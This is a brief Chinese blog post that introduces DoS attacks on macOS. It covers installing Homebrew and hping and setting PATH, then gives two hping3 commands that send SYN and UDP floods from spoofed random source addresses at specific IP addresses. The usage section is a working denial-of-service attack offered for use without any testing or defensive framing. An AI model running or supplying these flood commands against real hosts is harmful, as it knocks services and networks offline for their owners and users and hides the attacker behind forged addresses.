---
title: Mac hping3 dos攻击简单介绍
date: 2018-07-20 11:00:53
tags: [dos]
categories: [hping3]
---
## 安装
1. 安装homebrew
```
/usr/bin/ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)"
```
> homebrew 安装的文件默认在/usr/local/Cellar下
2. 安装 hping
``` 
  brew install hping
```
3. 环境变量配置
由于hping安装后文件在/usr/local/sbin下，所以得添加环境变量到.bash_profile 
```
export PATH=$PATH:/usr/local/sbin
```

## 使用
```
sudo hping3 -S -U --flood -V --rand-source 192.168.0.217
sudo  hping3  -d 120 -S -w 64 -p 80 --flood --rand-source 10.194.35.254  -i u100
```


